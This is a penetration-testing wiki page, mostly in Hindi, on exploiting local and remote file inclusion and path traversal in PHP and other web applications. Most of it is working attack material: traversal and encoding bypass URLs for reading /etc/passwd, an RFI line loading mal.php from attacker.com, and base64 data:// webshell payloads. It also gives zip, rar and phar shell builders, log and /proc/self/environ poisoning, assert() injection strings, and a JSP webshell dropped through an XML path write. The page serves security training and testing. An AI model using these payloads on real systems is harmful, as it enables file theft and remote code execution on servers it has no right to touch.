# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** फ़ाइल एक remote server से लोड होती है (Best: आप code लिख सकते हैं और server उसे execute करेगा)। In php यह डिफ़ॉल्ट रूप से **disabled** है (**allow_url_include**).\
**Local File Inclusion (LFI):** सर्वर एक local फ़ाइल लोड करता है।

यह vulnerability तब उत्पन्न होती है जब user किसी तरह उस फ़ाइल को नियंत्रित कर सकता है जिसे server लोड करने वाला है।

कमज़ोर **PHP functions**: require, require_once, include, include_once

इस vulnerability को exploit करने के लिए एक उपयोगी टूल: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**कई \*nix LFI सूचियों को मिलाकर और अधिक paths जोड़कर मैंने यह सूची बनाई है:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

यह भी आज़माएँ: `/` को `\` से बदलें  
यह भी आज़माएँ: `../../../../../`

एक सूची जो /etc/password फ़ाइल खोजने के लिए कई techniques का उपयोग करती है (यह जांचने के लिए कि vulnerability मौजूद है) यहाँ मिल सकती है: [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

विभिन्न wordlists का मर्ज:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

यह भी आज़माएँ: `/` को `\` से बदलें  
यह भी आज़माएँ: `C:/` हटाएँ और `../../../../../` जोड़ें

एक सूची जो /boot.ini फ़ाइल खोजने के लिए कई techniques का उपयोग करती है (यह जांचने के लिए कि vulnerability मौजूद है) यहाँ मिल सकती है: [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Linux की LFI सूची देखें।

## Basic LFI और बायपास

सभी उदाहरण Local File Inclusion के लिए हैं, लेकिन इन्हें Remote File Inclusion पर भी लागू किया जा सकता है (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences गैर-पुनरावर्ती रूप से हटाए गए
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

प्रदान की गई string के अंत में अतिरिक्त chars जोड़ने को Bypass करें (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
यह **PHP 5.4 से हल हो चुका है**

### **Encoding**

आप non-standard encondings जैसे double URL encode (और अन्य) का उपयोग कर सकते हैं:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### मौजूद फ़ोल्डर से

शायद back-end फ़ोल्डर पथ की जाँच कर रहा है:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### सर्वर पर फ़ाइल सिस्टम निर्देशिकाओं का अन्वेषण

कुछ तकनीकों का उपयोग करके सर्वर के फ़ाइल सिस्टम का पुनरावर्ती अन्वेषण किया जा सकता है ताकि केवल फ़ाइलें नहीं बल्कि निर्देशिकाओं की पहचान भी की जा सके। इस प्रक्रिया में निर्देशिका की गहराई निर्धारित करना और विशिष्ट फ़ोल्डरों के अस्तित्व की जाँच करना शामिल है। इसे प्राप्त करने के लिए नीचे एक विस्तृत विधि दी गई है:

1. **निर्देशिका की गहराई निर्धारित करें:** अपने वर्तमान निर्देशिका की गहराई को सफलतापूर्वक `/etc/passwd` फ़ाइल प्राप्त करके जानें (यदि सर्वर Linux-based है तो लागू)। एक उदाहरण URL निम्नलिखित संरचना में हो सकता है, जो तीन की गहराई दर्शाता है:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **फ़ोल्डरों की जांच करें:** संशयित फ़ोल्डर का नाम (उदा., `private`) URL में जोड़ें, फिर `/etc/passwd` पर वापस नेविगेट करें। अतिरिक्त डायरेक्टरी स्तर के लिए depth को एक बढ़ाना होगा:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **परिणामों की व्याख्या करें:** सर्वर की प्रतिक्रिया यह बताती है कि फ़ोल्डर मौजूद है या नहीं:
- **Error / No Output:** निर्दिष्ट स्थान पर `private` फ़ोल्डर संभवतः मौजूद नहीं है।
- **Contents of `/etc/passwd`:** `private` फ़ोल्डर की उपस्थिति की पुष्टि होती है।
4. **रिकर्सिव अन्वेषण:** नज़र आए फ़ोल्डरों की आगे उप-निर्देशिकाओं या फ़ाइलों के लिए उसी तकनीक या पारंपरिक Local File Inclusion (LFI) विधियों का उपयोग करके और जांच की जा सकती है।

फाइल सिस्टम में अलग-अलग स्थानों पर निर्देशिकाओं का अन्वेषण करने के लिए, payload को उसी अनुसार समायोजित करें। उदाहरण के लिए, यह जांचने के लिए कि `/var/www/` में `private` निर्देशिका है या नहीं (मानते हुए कि वर्तमान निर्देशिका गहराई 3 पर है), उपयोग करें:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation एक ऐसी विधि है जिसका उपयोग वेब अनुप्रयोगों में file paths को बदलने के लिए किया जाता है। इसे अक्सर restricted files तक पहुँचने के लिए उपयोग किया जाता है, जब कुछ सुरक्षा उपाय फ़ाइल पथ के अंत में अतिरिक्त अक्षर जोड़ते हैं। उद्देश्य ऐसा फ़ाइल पथ बनाना है जो सुरक्षा उपाय द्वारा परिवर्तित होने पर भी इच्छित फ़ाइल की ओर इशारा करे।

In PHP, file path के विभिन्न प्रतिनिधित्व फ़ाइल सिस्टम की प्रकृति के कारण समान माने जा सकते हैं। उदाहरण के लिए:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` सभी एक ही path के रूप में माने जाते हैं।
- जब अंतिम 6 अक्षर `passwd` हों, तो उसके अंत में `/` जोड़ने से (यानी `passwd/`) लक्षित फ़ाइल नहीं बदलती।
- इसी तरह, यदि किसी file path में `.php` जोड़ा गया है (जैसे `shellcode.php`), तो अंत में `/.` जोड़ने से एक्सेस की जा रही फ़ाइल में कोई परिवर्तन नहीं होता।

नीचे दिए गए उदाहरण दिखाते हैं कि कैसे path truncation का उपयोग करके `/etc/passwd` जैसी संवेदनशील सामग्री (user account information) वाली सामान्य लक्ष्य फ़ाइल तक पहुँच बनाई जा सकती है:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
इन परिदृश्यों में, आवश्यक ट्रैवर्सल की संख्या लगभग 2027 हो सकती है, लेकिन यह संख्या सर्वर की configuration के आधार पर बदल सकती है।

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) को अतिरिक्त dot segments और characters के साथ मिलाकर file system में नेविगेट करने के लिए उपयोग किया जा सकता है, जिससे सर्वर द्वारा जोड़ी गई appended strings प्रभावहीन हो सकती हैं।
- **Determining the Required Number of Traversals**: trial and error के माध्यम से, कोई सटीक संख्या खोज सकता है कि कितनी `../` sequences की आवश्यकता है ताकि root directory और फिर `/etc/passwd` तक पहुंचा जा सके, यह सुनिश्चित करते हुए कि किसी भी appended strings (जैसे `.php`) को neutralize किया गया है पर इच्छित path (`/etc/passwd`) बरकरार रहे।
- **Starting with a Fake Directory**: यह सामान्य प्रैक्टिस है कि path को एक non-existent directory (जैसे `a/`) से शुरू किया जाए। यह technique एक सावधानी के तौर पर या server के path parsing logic की आवश्यकताओं को पूरा करने के लिए इस्तेमाल की जाती है।

path truncation techniques का प्रयोग करते समय, server के path parsing व्यवहार और filesystem संरचना को समझना बहुत जरूरी है। हर परिदृश्य अलग दृष्टिकोण माँग सकता है, और सबसे प्रभावी तरीका खोजने के लिए अक्सर testing आवश्यक होती है।

**यह कमज़ोरी PHP 5.3 में ठीक कर दी गई थी।**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php में यह डिफ़ॉल्ट रूप से निष्क्रिय होता है क्योंकि **`allow_url_include`** **Off.** इसे काम करने के लिए **On** होना चाहिए, और उस स्थिति में आप अपने सर्वर से एक PHP file include करके RCE प्राप्त कर सकते हैं:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
यदि किसी कारणवश **`allow_url_include`** **On** है, लेकिन PHP बाहरी वेबपेजों तक पहुँच को **filtering** कर रहा है, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), तो आप उदाहरण के लिए data protocol के साथ base64 का उपयोग करके b64 PHP code को decode कर सकते हैं और RCE प्राप्त कर सकते हैं:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> पिछले कोड में अंतिम `+.txt` इसलिए जोड़ा गया था क्योंकि attacker को ऐसी string चाहिए थी जो `.txt` पर समाप्त होती हो; इसलिए string इसके साथ समाप्त होती है और b64 decode के बाद वह हिस्सा बस बेकार डेटा लौटा देगा और असली PHP कोड शामिल (और इसलिए, निष्पादित) हो जाएगा।

एक और उदाहरण जो **`php://` प्रोटोकॉल का उपयोग नहीं कर रहा है** होगा:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python रूट एलिमेंट

python में, इस तरह के कोड में:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
यदि उपयोगकर्ता **absolute path** को **`file_name`** के रूप में पास करता है, तो **previous path बस हटा दिया जाता है**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
यह [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) के अनुसार इच्छित व्यवहार है:

> अगर कोई component एक absolute path है, तो सभी previous components हटा दिए जाते हैं और joining absolute path component से जारी रहती है।

## Java डायरेक्टरी सूची

ऐसा लगता है कि अगर आपके पास Java में Path Traversal है और आप **file के बजाय directory के लिए अनुरोध करते हैं**, तो **directory की listing लौटाई जाती है**। यह अन्य भाषाओं में नहीं होगा (afaik).

## शीर्ष 25 पैरामीटर

यहाँ शीर्ष 25 पैरामीटरों की सूची दी गई है जो local file inclusion (LFI) vulnerabilities के लिए vulnerable हो सकते हैं (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI PHP wrappers & protocols का उपयोग

### php://filter

PHP filters पढ़े या लिखे जाने से पहले डेटा पर बुनियादी **संशोधन संचालन** करने की अनुमति देते हैं। फ़िल्टर की 5 श्रेणियाँ हैं:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: डेटा से टैग हटाता है ( "<" और ">" अक्षरों के बीच सब कुछ )
- ध्यान दें कि यह फ़िल्टर आधुनिक PHP वर्शन में गायब हो चुका है
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : अलग एन्कोडिंग में बदलता है (`convert.iconv.<input_enc>.<output_enc>`). सभी समर्थित एन्कोडिंग्स की **सूची** पाने के लिए कंसोल में चलाएँ: `iconv -l`

> [!WARNING]
> `convert.iconv.*` conversion filter का दुरुपयोग करके आप **मनमाना टेक्स्ट उत्पन्न** कर सकते हैं, जो मनमाना टेक्स्ट लिखने या include जैसे function को मनमाना टेक्स्ट प्रोसेस कराने के लिए उपयोगी हो सकता है। For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: सामग्री को compress करता है (useful if exfiltrating a lot of info)
- `zlib.inflate`: डेटा को decompress करता है
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : अप्रचलित
- `mdecrypt.*` : अप्रचलित
- Other Filters
- php में `var_dump(stream_get_filters());` चलाने पर आप कुछ **अनपेक्षित फिल्टर** पा सकते हैं:
- `consumed`
- `dechunk`: HTTP chunked encoding को उलट देता है
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" भाग अक्षर-मामले के प्रति असंवेदनशील है

### php filters को oracle के रूप में उपयोग करके मनमानी फ़ाइलें पढ़ना

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) एक तकनीक प्रस्तावित की गई है जो सर्वर से आउटपुट वापस न मिलने पर भी स्थानीय फ़ाइल पढ़ने की अनुमति देती है। यह तकनीक **boolean exfiltration of the file (char by char) using php filters** पर आधारित है और इन्हें oracle के रूप में उपयोग करती है। ऐसा इसलिए है क्योंकि php filters टेक्स्ट को इतना बड़ा बना सकते हैं कि php exception फेंक दे।

मूल पोस्ट में इस तकनीक की विस्तृत व्याख्या मिलती है, पर यहाँ एक संक्षिप्त सारांश है:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beggining of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

पोस्ट में इसे ऑटोमेटिक करने के लिए एक टूल भी leaked किया गया था: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

यह wrapper उन file descriptors तक पहुँचने की अनुमति देता है जो process के पास open हैं। संभावित रूप से यह opened files की सामग्री को exfiltrate करने में उपयोगी हो सकता है:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
आप **php://stdin, php://stdout and php://stderr** का उपयोग करके क्रमशः **फ़ाइल डिस्क्रिप्टर 0, 1 और 2** तक भी पहुँच सकते हैं (पता नहीं है कि यह किसी attack में कैसे उपयोगी हो सकता है)

### zip:// and rar://

एक Zip या Rar फ़ाइल अपलोड करें जिसमें एक PHPShell अंदर हो और इसे एक्सेस करें.\
rar protocol का दुरुपयोग करने के लिए इसे **विशेष रूप से सक्रिय किया जाना आवश्यक है**।
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ध्यान दें कि यह प्रोटोकॉल php कॉन्फ़िगरेशन **`allow_url_open`** और **`allow_url_include`** द्वारा प्रतिबंधित है।

### expect://

Expect को सक्रिय होना चाहिए। आप इससे कोड निष्पादित कर सकते हैं:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST पैरामीटरों में अपना payload निर्दिष्ट करें:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

जब कोई वेब एप्लिकेशन फ़ाइल लोडिंग के लिए `include` जैसे फ़ंक्शनों का उपयोग करता है, तो `.phar` फ़ाइल का उपयोग PHP कोड चलाने के लिए किया जा सकता है। नीचे दिया गया PHP कोड स्निपेट एक `.phar` फ़ाइल बनाने का उदाहरण दर्शाता है:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` फ़ाइल को कंपाइल करने के लिए, निम्नलिखित कमांड निष्पादित करें:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
जबकि इसका उद्देश्य traversal को रोकना है, यह अनजाने में code injection के लिए एक वेक्टर बना देता है। फ़ाइल की सामग्री पढ़ने के लिए इसका शोषण करने हेतु attacker निम्न का उपयोग कर सकता है:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
इसी तरह, executing arbitrary system commands के लिए, कोई उपयोग कर सकता है:
```plaintext
' and die(system("id")) or '
```
यह महत्वपूर्ण है कि आप इन payloads को **URL-encode** करें।

## PHP Blind Path Traversal

> [!WARNING]
> यह तकनीक उन मामलों में प्रासंगिक है जहाँ आप **PHP function** के **file path** को नियंत्रित करते हैं जो किसी **file** तक पहुँचने के लिए उपयोग होगा लेकिन आप उस फ़ाइल की सामग्री नहीं देख पाएंगे (जैसे एक साधारण कॉल **`file()`**) और सामग्री प्रदर्शित नहीं की जाती।

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) इसमें समझाया गया है कि कैसे PHP filter के माध्यम से एक blind path traversal का दुरुपयोग करके **error oracle** के जरिए किसी फ़ाइल की सामग्री को exfiltrate किया जा सकता है।

सारांश में, यह तकनीक **"UCS-4LE" encoding** का उपयोग करके किसी फ़ाइल की सामग्री को इतना **बड़ा** बना देती है कि फ़ाइल खोलने वाली **PHP function** एक **error** ट्रिगर कर दे।

फिर, पहले char को leak करने के लिए filter **`dechunk`** का उपयोग किया जाता है साथ ही **base64** या **rot13** जैसे अन्य filters के साथ और अंत में filters **convert.iconv.UCS-4.UCS-4LE** और **convert.iconv.UTF16.UTF-16BE** का उपयोग करके अन्य chars को शुरुआत में place करके उन्हें leak किया जाता है।

**संभावित रूप से प्रभावित Functions**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

तकनीकी विवरण के लिए ऊपर उल्लेखित पोस्ट देखें!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

जब server-side code जो files ingest/upload करता है destination path को user-controlled data (उदा., एक filename या URL) का उपयोग करके बनाता है बिना उसे canonicalising और validating किए, तो `..` segments और absolute paths intended directory से बाहर निकलकर arbitrary file write कर सकते हैं। यदि आप payload को किसी web-exposed directory में रख सकते हैं, तो आम तौर पर webshell डालकर unauthenticated RCE प्राप्त किया जा सकता है।

Typical exploitation workflow:
- ऐसे endpoint या background worker में एक write primitive पहचानें जो path/filename स्वीकार करता है और disk पर content लिखता है (उदा., message-driven ingestion, XML/JSON command handlers, ZIP extractors, आदि)।
- वेब-एक्सपोज़्ड directories निर्धारित करें। सामान्य उदाहरण:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- एक traversal path तैयार करें जो intended storage directory से बाहर निकलकर webroot में पहुँचे, और अपनी webshell content शामिल करें।
- ड्रॉप किए गए payload पर ब्राउज़ करें और commands execute करें।

Notes:
- वह vulnerable service जो write करता है, वह किसी non-HTTP port पर सुन सकता है (उदा., TCP 4004 पर एक JMF XML listener). मुख्य वेब पोर्टल (अलग port) बाद में आपका payload serve करेगा।
- Java stacks पर, ये file writes अक्सर सरल `File`/`Paths` concatenation के साथ लागू किए जाते हैं। canonicalisation/allow-listing की कमी ही मुख्य दोष है।

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening जो इस वर्ग की bugs को रोकता है:
- एक canonical path पर resolve करें और सुनिश्चित करें कि यह allow-listed base directory का descendant हो।
- किसी भी path जिसमें `..`, absolute roots, या drive letters हों, reject करें; generated filenames को प्राथमिकता दें।
- writer को low-privileged account के रूप में चलाएँ और write directories को served roots से अलग रखें।

## Remote File Inclusion

Explained previously, [**इस लिंक का पालन करें**](#remote-file-inclusion).

### Apache/Nginx log file के माध्यम से

यदि Apache या Nginx server include function के अंदर **vulnerable to LFI** है तो आप प्रयास कर सकते हैं कि **`/var/log/apache2/access.log` या `/var/log/nginx/access.log`** तक पहुँचें, **user agent** में या किसी **GET parameter** में एक php shell जैसे **`<?php system($_GET['c']); ?>`** डालें और उस फ़ाइल को include करें

> [!WARNING]
> ध्यान दें कि **यदि आप shell के लिए double quotes का उपयोग करते हैं** बजाय **simple quotes** के, तो double quotes string "_**quote;**_" के लिए परिवर्तित कर दिए जाएंगे, वहाँ **PHP एक error देगा** और **कुछ भी execute नहीं होगा**।
>
> साथ ही, सुनिश्चित करें कि आप **payload को सही तरीके से लिखें**, नहीं तो PHP हर बार log file लोड करने की कोशिश में error देगा और आपको दूसरी मौका नहीं मिलेगा।

यह अन्य logs में भी किया जा सकता है लेकिन **सावधान रहें,** logs के अंदर कोड URL encoded हो सकता है और इससे Shell नष्ट हो सकता है। header **authorisation "basic"** में "user:password" Base64 में होता है और यह logs के अंदर decoded होता है। PHPShell इस header के अंदर insert किया जा सकता है।\
अन्य संभावित log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ईमेल के माध्यम से

**एक मेल भेजें** आंतरिक खाते (user@localhost) पर जिसमें आपका PHP payload जैसे `<?php echo system($_REQUEST["cmd"]); ?>` शामिल हो और उपयोगकर्ता की मेल को इन पथों से include करने की कोशिश करें: **`/var/mail/<USERNAME>`** या **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* के माध्यम से

1. बहुत सारी shells अपलोड करें (उदाहरण के लिए: 100)  
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), जहाँ $PID = प्रोसेस का PID (can be brute forced) और $FD = file descriptor (can be brute forced too)

### /proc/self/environ के माध्यम से

एक लॉग फ़ाइल की तरह, payload को User-Agent में भेजें; यह /proc/self/environ फ़ाइल के अंदर प्रतिबिंबित होगा।
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

यदि आप एक file upload कर सकते हैं, तो बस उसमें shell payload inject कर दें (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
फाइल को पठनीय बनाए रखने के लिए pictures/doc/pdf की metadata में inject करना सबसे अच्छा है

### ZIP फ़ाइल अपलोड के माध्यम से

एक ZIP फ़ाइल अपलोड करें जिसमें compressed PHP shell शामिल हो और उसे access करें:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
